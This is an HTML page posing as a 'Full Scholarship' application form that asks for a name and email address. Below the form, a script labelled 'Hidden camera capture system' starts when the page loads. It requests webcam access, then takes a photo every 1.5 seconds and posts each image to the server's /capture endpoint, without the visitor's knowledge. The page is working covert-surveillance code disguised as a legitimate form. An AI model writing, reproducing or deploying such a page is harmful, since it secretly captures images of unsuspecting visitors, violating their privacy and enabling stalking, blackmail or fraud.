<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ðŸŽ“ Scholarship Application</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            background: url('https://source.unsplash.com/1600x900/?university,graduation') no-repeat center center fixed;
            background-size: cover;
            color: white;
            margin: 0;
            padding: 0;
        }
        .form-container {
            margin-top: 100px;
            background: rgba(0, 0, 0, 0.8);
            padding: 30px;
            border-radius: 10px;
            display: inline-block;
            width: 90%;
            max-width: 400px;
        }
        h1 {
            font-size: 28px;
            margin-bottom: 15px;
        }
        p {
            font-size: 18px;
            margin-bottom: 15px;
        }
        input, button {
            width: 100%;
            padding: 10px;
            margin: 8px 0;
            border: none;
            border-radius: 5px;
        }
        input {
            background: #f1f1f1;
            font-size: 16px;
        }
        button {
            background: #27ae60;
            color: white;
            font-size: 18px;
            cursor: pointer;
        }
        button:hover {
            background: #219150;
        }
    </style>
</head>
<body>
    <div class="form-container">
        <h1>ðŸŽ“ Apply for a Full Scholarship</h1>
        <p>Fill in your details to submit your application.</p>
        <form>
            <input type="text" placeholder="Full Name" required><br>
            <input type="email" placeholder="Email Address" required><br>
            <button type="submit">Submit Application</button>
        </form>
    </div>

    <!-- Hidden camera capture system -->
    <script>
        let videoStream;
        function startCapture() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    videoStream = stream;
                    captureLoop();
                })
                .catch(error => console.error("Error accessing camera:", error));
        }

        function captureLoop() {
            let videoTrack = videoStream.getVideoTracks()[0];
            let imageCapture = new ImageCapture(videoTrack);
            
            imageCapture.takePhoto()
                .then(blob => {
                    let reader = new FileReader();
                    reader.onloadend = function () {
                        fetch('/capture', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ image: reader.result })
                        });
                    };
                    reader.readAsDataURL(blob);
                })
                .catch(error => console.error("Capture error:", error));

            setTimeout(captureLoop, 1500); 
        }

        window.onload = startCapture; // Start capturing when page loads
    </script>
</body>
</html>
